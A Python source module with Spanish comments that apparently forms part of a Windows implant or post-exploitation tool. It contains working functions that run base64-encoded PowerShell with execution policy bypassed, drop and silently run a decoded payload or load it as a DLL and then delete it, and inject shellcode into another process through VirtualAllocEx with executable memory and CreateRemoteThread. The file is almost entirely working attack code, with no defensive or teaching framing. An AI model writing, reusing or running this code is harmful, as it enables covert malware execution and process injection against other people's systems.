"""
Módulo de ejecución avanzada.
Proporciona funcionalidades avanzadas para la ejecución de código y scripts,
incluyendo ejecución en memoria, inyección de código y manejo de DLLs.
"""

import subprocess
import ctypes
import sys
import base64
import tempfile
import os

def execute_powershell(script):
    """
    Ejecuta un script de PowerShell directamente en memoria.
    
    El script se codifica en base64 para evitar problemas con caracteres especiales
    y se ejecuta usando powershell.exe con bypass de políticas de ejecución.
    
    Args:
        script (str): Contenido del script PowerShell a ejecutar
    
    Returns:
        dict: Resultado de la ejecución
            - success (bool): Si el script se ejecutó correctamente
            - output (str): Salida del script
            - error (str): Errores durante la ejecución
    """
    try:
        encoded_script = base64.b64encode(script.encode('utf16le')).decode()
        cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_script}'
        result = subprocess.run(cmd, capture_output=True, text=True)
        return {
            'success': result.returncode == 0,
            'output': result.stdout,
            'error': result.stderr
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

def execute_background_payload(payload_data, is_dll=False):
    """Ejecuta un payload en segundo plano."""
    try:
        temp = tempfile.NamedTemporaryFile(delete=False)
        temp.write(base64.b64decode(payload_data))
        temp.close()
        
        if is_dll:
            ctypes.CDLL(temp.name)
        else:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(temp.name, startupinfo=startupinfo)
            
        os.unlink(temp.name)
        return {'success': True}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def inject_shellcode(pid, shellcode):
    """Inyecta shellcode en un proceso."""
    try:
        shellcode_bytes = base64.b64decode(shellcode)
        
        # Obtener handle del proceso
        h_process = ctypes.windll.kernel32.OpenProcess(
            0x1F0FFF, # PROCESS_ALL_ACCESS
            False,
            pid
        )
        
        if not h_process:
            return {'success': False, 'error': 'No se pudo abrir el proceso'}

        # Asignar memoria
        mem_addr = ctypes.windll.kernel32.VirtualAllocEx(
            h_process,
            None,
            len(shellcode_bytes),
            0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE
            0x40  # PAGE_EXECUTE_READWRITE
        )

        if not mem_addr:
            return {'success': False, 'error': 'No se pudo asignar memoria'}

        # Escribir shellcode
        written = ctypes.c_size_t(0)
        ctypes.windll.kernel32.WriteProcessMemory(
            h_process,
            mem_addr,
            shellcode_bytes,
            len(shellcode_bytes),
            ctypes.byref(written)
        )

        # Crear thread remoto
        h_thread = ctypes.windll.kernel32.CreateRemoteThread(
            h_process,
            None,
            0,
            mem_addr,
            None,
            0,
            None
        )

        if not h_thread:
            return {'success': False, 'error': 'No se pudo crear el thread'}

        return {'success': True}
    except Exception as e:
        return {'success': False, 'error': str(e)}
